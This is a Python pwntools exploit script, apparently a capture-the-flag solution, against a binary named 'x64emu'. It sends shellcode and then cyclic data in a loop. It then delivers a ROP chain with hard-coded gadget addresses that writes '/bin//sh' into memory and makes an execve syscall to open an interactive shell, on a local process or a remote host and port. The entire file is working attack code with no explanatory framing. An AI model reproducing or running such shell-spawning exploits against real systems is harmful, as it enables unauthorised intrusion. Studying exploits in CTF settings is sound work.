#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#import os
code = ELF('./x64emu', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
binsh = lambda : next(libc.search('/bin/sh'))
uu64 = lambda x: u64(x.ljust(8, '\0'))


def exploit(r):
    sc = asm('''
mov rax, 0
here:
inc rax
cmp rax, 100000
jle here
''', arch='amd64')
    r.sendlineafter(': ', str(2000))
    r.sendlineafter(': ', str(len(sc)))
    r.sendafter(': ', sc)

    i = 310
    while True:
        r.sendlineafter(': ', str(i))
        r.sendlineafter(': ', str(123))
        r.sendafter(': ', cyclic(123))
        tmp = r.recvuntil('Timeout.')
        if 'done.' in tmp:
            break

    r.sendlineafter(': ', str(i))
    r.sendlineafter(': ', str(0x39b8))
    raw_input('#')
    #r.sendafter(': ', flat(0x800000004, 0).ljust(0x39b8, '\x00'))

    p = ''
    p += p64(0x0000000000bb8505) # pop rsi ; ret
    p += p64(0x000000000188a160) # @ .data
    p += p64(0x00000000005d415d) # pop rax ; ret
    p += '/bin//sh'
    p += p64( 0x00000000013e6b95) # mov qword ptr [rsi], rax ; ret
    p += p64( 0x0000000000bb8505) # pop rsi ; ret
    p += p64( 0x000000000188a168) # @ .data + 8
    p += p64( 0x00000000013c38f9) # xor rax, rax ; ret
    p += p64( 0x00000000013e6b95) # mov qword ptr [rsi], rax ; ret
    p += p64( 0x00000000005a4410) # pop rdi ; ret
    p += p64( 0x000000000188a160) # @ .data
    p += p64( 0x0000000000bb8505) # pop rsi ; ret
    p += p64( 0x000000000188a168) # @ .data + 8
    p += p64( 0x00000000005a7d57) # pop rdx ; ret
    p += p64( 0x000000000188a168) # @ .data + 8
    p += p64(0x00000000005d415d)
    p += p64(0x3b)
    p += p64(0x0000000000403862) # syscall

    r.sendafter(': ', fit({
        0: p,
        0xd8: 0x0000000000a92410,
    }, filler='\0', length=0x39b8))
    r.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = code.process()
    exploit(r)
